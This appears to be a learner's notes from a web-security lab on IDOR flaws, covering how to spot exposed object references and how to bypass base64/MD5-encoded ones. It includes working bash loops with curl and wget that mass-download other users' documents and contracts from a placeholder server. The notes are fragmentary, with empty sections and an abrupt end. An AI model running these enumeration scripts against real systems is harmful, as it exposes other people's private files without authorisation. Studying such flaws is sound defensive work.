

IDOR vulnerabilities occur when a web application exposes a direct reference to an object, like a file or a database resource, which the end-user can directly control to obtain access to other similar objects. If any user can access any resource due to the lack of a solid access control system, the system is considered to be vulnerable.

Just exposing a direct reference to an internal object or resource is not a vulnerability in itself. However, this may make it possible to exploit another vulnerability: a weak access control system. 
IDOR vulnerabilities may also lead to the elevation of user privileges from a standard user to an administrator user, with IDOR Insecure Function Calls.


# Identifying IDORs


### AJAX Calls




The following example shows a basic example of an AJAX call:

```
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```







        ---Mass IDOR Enumeration


        -Insecure Parameters

        http://SERVER_IP:PORT/documents.php?uid=1


## Mass Enumeration

    we can either use a tool like Burp Intruder or ZAP Fuzzer to retrieve all files or write a small bash script to download all files

We can click on [CTRL+SHIFT+C] in Firefox to enable the element inspector, and then click on any of the links to view their HTML source code, and we will get the following:

```
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li
```

`$ curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"`


`$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"`





Now, we can use a simple for loop to loop over the uid parameter and return the document of all employees, and then use wget to download each document link:

```
#!/bin/bash
url="http://SERVER_IP:PORT"
for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

When we run the script, it will download all documents from all employees with uids between 1-10, thus successfully exploiting the IDOR vulnerability to mass enumerate the documents of all employees.




        --Bypassing Encoded References



        -Function Disclosure

        As most modern web applications are developed using JavaScript frameworks, like Angular, React, or Vue.js, many web developers may make the mistake of performing sensitive functions on the front-end, which would expose them to attackers.



        If we take a look at the link in the source code, we see that it is calling a JavaScript function with javascript:downloadContract('1'). Looking at the downloadContract() function in the source code, we see the following:

        function downloadContract(uid) {
            $.redirect("/download.php", {
                contract: CryptoJS.MD5(btoa(uid)).toString(),
            }, "POST", "_self");
        }


        This function appears to be sending a POST request with the contract parameter, which is what we saw above. The value it is sending is an md5 hash using the CryptoJS library, which also matches the request we saw earlier. So, the only thing left to see is what value is being hashed.

        In this case, the value being hashed is btoa(uid), which is the base64 encoded string of the uid variable, which is an input argument for the function. Going back to the earlier link where the function was called, we see it calling downloadContract('1'). So, the final value being used in the POST request is the base64 encoded string of 1, which was then md5 hashed.

        Tip: We are using the -n flag with echo, and the -w 0 flag with base64, to avoid adding newlines, in order to be able to calculate the md5 hash of the same value, without hashing newlines, as that would change the final md5 hash.




        --Mass Enumeration

        Once again, let us write a simple bash script to retrieve all employee contracts.

        We can start by calculating the hash for each of the first ten employees using the same previous command while using tr -d to remove the trailing - characters, as follows:


        $ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done

        Next, we can make a POST request on download.php with each of the above hashes as the contract value, which should give us our final script:

        #!/bin/bash

        for i in {1..10}; do
            for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
                curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
            done
        done



        


        ---IDOR in Insecure APIs


        While IDOR Information Disclosure Vulnerabilities allow us to read various types of resources, IDOR Insecure Function Calls enable us to call APIs or execute functions as another user. Such functions and APIs can be used to change another user's private information, reset another user's password, or even buy items using another user's payment information.



        --Exploiting Insecure APIs


        --Chaining IDOR Vulnerabilities

        